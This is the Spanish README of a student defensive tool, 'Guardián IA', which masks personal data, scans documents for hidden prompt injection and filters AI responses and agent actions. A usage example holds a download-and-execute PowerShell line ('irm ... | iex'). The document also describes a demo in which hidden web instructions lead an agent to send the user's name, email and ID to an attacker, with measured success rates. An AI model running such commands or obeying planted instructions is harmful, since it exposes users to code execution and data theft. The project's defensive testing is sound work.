# 🛡️ Guardián IA

Programa que se pone **entre tú y la IA** para que puedas usarla sin regalarle tus datos, sin que un documento la manipule y sin que su respuesta te meta en un lío. Lo que ve tus datos funciona entero en tu ordenador con un modelo local (Ollama).

Proyecto de la asignatura *Proyectos de Ciberseguridad - Ciberejercicios*. Autor: Antonio De Mateo Bodegas. Licencia MIT.

```
 Tú ──► [ADUANA] ──► [ESCUDO] ──► IA (solo ve [PERSONA_1], [DNI_1]...) ──► [VERIFICADOR] ──► [ESCUDO] ──► Tú
        ¿órdenes      tapa DNI, IBAN,                                       ¿comandos         vuelve a poner
        escondidas?   nombres, claves...                                    peligrosos?       tus datos
                                                                            ¿enlaces falsos?
        [REVISOR DEL PC]: extensiones, conectores MCP, modelos descargados y Ollama
```

## Qué hace

| Módulo | Qué hace |
| --- | --- |
| **1. Escudo de datos** | Detecta 11 tipos de dato con reglas validadas (letra del DNI y NIE, Luhn en tarjetas, control del IBAN...) y, con la IA local, nombres, direcciones y contraseñas escritas a mano. Los cambia por marcadores (`[DNI_1]`) y los devuelve en la respuesta. |
| **2. Verificador de respuestas** | Revisa lo que contesta la IA: comandos que descargan y ejecutan programas (ClickFix), datos metidos en enlaces o imágenes para sacarlos fuera, webs que imitan a tu banco, enlaces acortados, peticiones de contraseñas, si ha contado sus instrucciones internas (código canario) y si lo que dice sale del documento o se lo inventa. |
| **3. Aduana de documentos** | Busca prompt injection en textos, HTML, **Word y PDF**: frases de ataque en español e inglés, caracteres invisibles, mensajes escritos con letras invisibles ("ASCII smuggling", que traduce para que veas qué dicen), órdenes en base64 y **texto que tú no ves pero la IA sí** (letra blanca, diminuta, oculta, fuera de la página). Bloquea lo peligroso y a la IA solo le pasa lo que tú ves. También avisa de macros, plantillas remotas tipo Follina y PDF con JavaScript. |
| **4. Revisor de la IA del PC** | Nota de salud de 0 a 100: extensiones del navegador maliciosas o con demasiados permisos, conectores MCP (Claude Desktop, Cursor, VS Code...) con secretos en claro o acceso a todo el disco, modelos descargados con código escondido (pickle, Keras, plantillas GGUF envenenadas) y Ollama abierto a la red. Solo mira: no cambia nada. |
| **Modo proxy** | El Guardián delante de **cualquier programa** que hable con la IA en formato OpenAI (agentes, Open WebUI, extensiones...). Además vigila las **acciones de los agentes**: bloquea las que llevan comandos peligrosos, sacan datos en un enlace, llegan justo después de leer algo sospechoso o mandan algo a un destino que no has escrito tú. |

Regla de oro: las piezas que ven tus datos sin tapar (el detector y los jueces) **solo pueden usar una IA local**; el código se niega a usar una remota. La IA que responde puede estar en la nube (Ollama Cloud u otra API), pero entonces solo recibe marcadores.

## Instalación (Windows)

Requisitos: Python 3.11 o superior y [Ollama](https://ollama.com) con un modelo (`ollama pull qwen3.5:9b`; en un PC sin tarjeta gráfica potente, `qwen3.5:4b` o `qwen3.5:2b`).

```powershell
cd guardian_ia
python -m venv .venv
.venv\Scripts\Activate.ps1
pip install -r requirements.txt
python -m guardian estado
```

Para instalarlo como programa (comando `guardian`): `pip install -e ".[web,dev]"`.

## Uso

Para ver los cuatro módulos en un minuto, sin Ollama y con ejemplos preparados (añade `--pausa` para ir paso a paso al presentarlo):

```powershell
python -m guardian demo
```

```powershell
python -m guardian estado                                   # ¿está lista la IA?
python -m guardian proteger "Mi DNI es 12345678Z"           # qué vería la IA (no necesita Ollama)
python -m guardian chat --ia                                # chat protegido (con detector y juez IA locales)
python -m guardian aduana ejemplos\cv_con_trampa.docx       # ¿el documento esconde órdenes?
python -m guardian verificar "Pega esto: irm https://x.example/a.ps1 | iex"
python -m guardian revisar                                  # revisa la IA de tu PC (--demo: un PC de prueba)
python -m guardian proxy                                    # Guardián para otros programas en http://127.0.0.1:8787/v1
python -m guardian evaluar --ia                             # mide todo con la IA de verdad
streamlit run app_web.py                                    # todo lo anterior en el navegador
python -m pytest                                            # pruebas automáticas
```

Dentro del chat: `/doc RUTA` adjunta un documento (texto, Word o PDF) a la siguiente pregunta, `/ver` enseña u oculta lo que ve la IA, `/nueva` vacía la bóveda de datos y `/salir` cierra.

### IA en la nube o en otro programa

| Proveedor | Cómo | Notas |
| --- | --- | --- |
| Ollama en tu PC | (por defecto) | Nada sale del ordenador |
| Ollama Cloud | `--proveedor ollama-cloud --modelo gpt-oss:120b` y la clave en `OLLAMA_API_KEY` | Modelos grandes; solo reciben datos tapados |
| Cualquier API tipo OpenAI | `--proveedor openai --url http://127.0.0.1:1234/v1 --modelo ...` y la clave (si hace falta) en `GUARDIAN_API_KEY` | LM Studio, llama.cpp, vLLM, OpenAI, OpenRouter... |

### Modo proxy y agentes

```powershell
python -m guardian proxy --clave mi-clave-larga --sin-pensar   # terminal 1 (con --ia, el juez revisa también lo que lee el agente)
python ejemplos\agente_demo.py --directo                        # terminal 2: agente SIN Guardián
python ejemplos\agente_demo.py --clave mi-clave-larga           # agente CON Guardián
python ejemplos\agente_demo.py --clave mi-clave-larga --veces 10 --temperatura 0.7   # repetir el ataque y contar
```

`agente_demo.py` es un agente con dos herramientas de mentira (leer una web y mandar un correo). La web tiene órdenes escondidas para que mande tu nombre, correo y DNI a un atacante (`--trampa suave` usa otra orden, con frases de ataque de las de siempre, y `--trampa ninguna` es la web sin trampa). En cualquier programa compatible, pon como dirección de la IA `http://127.0.0.1:8787/v1` y como clave la del proxy.

En la ventana del proxy sale una línea por petición con lo que ha hecho el Guardián, sin enseñar ningún dato:

```text
[proxy] POST /v1/chat/completions -> 200 · datos tapados: 1 EMAIL, 1 DNI · 1 resultado de herramienta revisado · acción bloqueada: enviar_correo · la IA ha contestado sin ella · 7.4 s
```

Con `--leer-sospechosos`, una web o un archivo con riesgo ALTO no se bloquea entero: la IA lo lee sin las partes ocultas para poder contestarte, pero no puede hacer ninguna acción (y al final de la respuesta te avisa de que lo que ha leído traía órdenes ocultas). Con `--confirmar`, el proxy te pregunta antes de dejar pasar una acción dudosa en vez de bloquearla (`--confirmar enviar_correo` pregunta siempre por esa herramienta). Si el Guardián bloquea una acción, le cuenta a la IA por qué y le pide que conteste sin ella, para que el ataque no te deje sin respuesta (`--parar-tras-bloqueo` lo desactiva). `--marcar-datos delimitar` (o `marcas`) señala a la IA lo que viene de las herramientas para que no lo tome por órdenes ("spotlighting").

`--sin-pensar` pide al modelo que no "piense" en voz alta (`reasoning_effort: none`), que con Qwen3.5 es varias veces más rápido. Para el proveedor `openai` se pueden añadir opciones así a cada petición con una variable: `$env:GUARDIAN_OPENAI_EXTRA='{"reasoning_effort":"none"}'`.

## Resultados

Se mide con un conjunto de **desarrollo** (usado para ajustar), una **prueba ciega** (escrita a mano con otras frases, no se usó para ajustar nada) y dos **conjuntos públicos** de otros investigadores. Todos los detalles y el método están en [`docs/evaluacion.md`](docs/evaluacion.md).

| | Solo reglas | Reglas + Qwen3.5 2B | Reglas + Qwen3.5 9B |
| --- | --- | --- | --- |
| Escudo, prueba ciega: datos que se escapan (fuga) | 38 % | 2,7 % | **0 %** |
| Aduana, prueba ciega: ataques detectados / falsas alarmas | 30 % / 0 % | 50 % / 0 % | **100 % / 0 %** |
| Aduana, BIPIA (Microsoft): ataques detectados / falsas alarmas | 54 % / 0 % | 54 % / 0 % | **76 % / 2 %** |
| Nombres de personas, CoNLL-2002: recall | 0 % | 57 % | **94 %** |

**Ataque a un agente con herramientas** (10 intentos, una web con una orden escondida para que el agente mande tu nombre, correo y DNI a un atacante):

| Agente | Sin Guardián: tus datos llegan al atacante | Con Guardián: llegan al atacante | Con Guardián: recibes las ofertas que pediste |
| --- | --- | --- | --- |
| Qwen3.5 2B, trampa directa | 5 de 10 | **0 de 10** | 10 de 10 |
| Qwen3.5 9B, trampa directa | 10 de 10 | **0 de 10** | 10 de 10 |
| Qwen3.5 9B, trampa suave | 10 de 10 | **0 de 10** | 10 de 10 (con `--leer-sospechosos`) |

El modelo grande obedece más a la trampa. Las reglas no reconocen la trampa directa, pero el control del flujo de datos la para igualmente, y como el proxy le pide a la IA que siga sin la acción bloqueada, recibes lo que pediste. En 160 intentos con trampa, ningún correo llegó al atacante. Sin trampa, el Guardián no estorba (10 de 10). Detalle, spotlighting y lo que todavía se escapa en [`docs/evaluacion.md`](docs/evaluacion.md#6-ataque-a-un-agente-con-herramientas).

Experimento de diseño del detector (32 textos): pedir **una lista por tipo de dato** en vez de una lista de objetos sube el F1 de 0,61 a 0,94 con Qwen3.5 2B y de 0,71 a 0,95 con Qwen3.5 9B.

## Documentación

| Documento | Contenido |
| --- | --- |
| [`docs/arquitectura.md`](docs/arquitectura.md) | Diagrama del flujo y de dónde interviene la IA, qué datos ve cada modelo, tecnologías y hardware |
| [`docs/amenazas.md`](docs/amenazas.md) | Análisis de riesgos: OWASP Top 10 para LLM 2025, prompt injection, fuga de información y control de acciones del propio Guardián |
| [`docs/estado_del_arte.md`](docs/estado_del_arte.md) | Herramientas parecidas (con y sin IA) e investigación en la que se basa |
| [`docs/evaluacion.md`](docs/evaluacion.md) | Método y todos los resultados |
| [`docs/casos_de_prueba.md`](docs/casos_de_prueba.md) | Casos de prueba automáticos y manuales |
| [`docs/uso_de_ia.md`](docs/uso_de_ia.md) | Cómo se ha usado la IA para desarrollar el proyecto |
| [`docs/planificacion.md`](docs/planificacion.md) | Hitos: el plan de 12 semanas frente a lo hecho, qué ha cambiado y por qué, y lo que queda |
| [`CONTRIBUTING.md`](CONTRIBUTING.md) y [`SECURITY.md`](SECURITY.md) | Cómo contribuir y cómo avisar en privado de una forma de saltarse el Guardián |
| [`CHANGELOG.md`](CHANGELOG.md) | Historial de versiones |

## Estructura

```
guardian/
  escudo/       reglas validadas, detector IA, tapar y restaurar
  aduana/       reglas, lectores de Word y PDF, juez IA
  verificador/  comandos, enlaces, respaldo en el documento
  revisor/      extensiones, conectores MCP, modelos, red
  ia.py         Ollama, Ollama Cloud y APIs tipo OpenAI
  nucleo.py     aduana → escudo → IA → verificador → restaurar → registro
  proxy.py      modo proxy: control de acciones y del flujo de datos, confirmación, spotlighting
  demo.py       demostración de los cuatro módulos (python -m guardian demo)
evaluacion/     conjuntos, experimentos y resultados
ejemplos/       documentos con trampa y limpios, agente de demostración
tests/          pruebas automáticas (IA falsa: no necesitan Ollama)
docs/           documentación
app_web.py      web en el navegador (solo escucha en tu PC)
```

## Límites

- Las reglas cubren sobre todo formatos españoles y frases en español e inglés.
- No se analizan imágenes (texto dentro de una captura).
- El detector y los jueces dependen del modelo: el 9B acierta más que el 2B pero tarda más.
- Ninguna defensa contra la prompt injection es perfecta: el Guardián usa varias capas para que un ataque tenga que saltarlas todas.
